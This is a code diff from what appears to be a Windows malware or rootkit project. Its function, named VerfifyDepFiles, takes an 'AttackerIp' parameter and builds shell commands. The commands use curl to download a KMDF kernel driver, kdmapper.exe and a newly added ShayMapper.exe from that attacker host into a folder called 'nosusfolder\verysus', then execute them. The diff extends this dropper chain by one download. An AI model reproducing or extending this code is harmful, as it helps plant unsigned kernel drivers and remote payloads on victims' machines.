@@ -251,10 +251,12 @@ int VerfifyDepFiles(const char* AttackerIp) {
         "if not exist nosusfolder\\verysus\\KMDFdriver\\Release\\KMDFdriver.sys curl http://~:8080/KMDFdriver/x64/Release/KMDFdriver/KMDFdriver.sys --output nosusfolder\\verysus\\KMDFdriver\\Release\\KMDFdriver.sys  > nul && ",
         "if not exist nosusfolder\\verysus\\KMDFdriver\\Release\\KMDFdriver.inf curl http://~:8080/KMDFdriver/x64/Release/KMDFdriver/KMDFdriver.inf --output nosusfolder\\verysus\\KMDFdriver\\Release\\KMDFdriver.inf  > nul && ",
         "if not exist nosusfolder\\verysus\\KMDFdriver\\Release\\KMDFdriver.pdb curl http://~:8080/KMDFdriver/x64/Release/KMDFdriver.pdb --output nosusfolder\\verysus\\KMDFdriver\\Release\\KMDFdriver.pdb  > nul && ",
-        "if not exist nosusfolder\\verysus\\kdmapper.exe curl http://~:8080/kdmapper/x64/Release/kdmapper.exe --output nosusfolder\\verysus\\kdmapper.exe" };
+        "if not exist nosusfolder\\verysus\\kdmapper.exe curl http://~:8080/kdmapper/x64/Release/kdmapper.exe --output nosusfolder\\verysus\\kdmapper.exe > nul && ",
+        "if not exist nosusfolder\\verysus\\ShayMapper.exe curl http://~:8080/ShayMapper/x64/Release/ShayMapper.exe --output nosusfolder\\verysus\\ShayMapper.exe > nul "};
+
     const char* ReplaceArr[1] = { AttackerIp };
     const char* SymbolsArr = "~";
-    const int TotalCommands = 19;
+    const int TotalCommands = 20;
     if (!PerformCommand(FileCommands, ReplaceArr, SymbolsArr, TotalCommands, 1)) {
         return (int)GetLastError();
     }
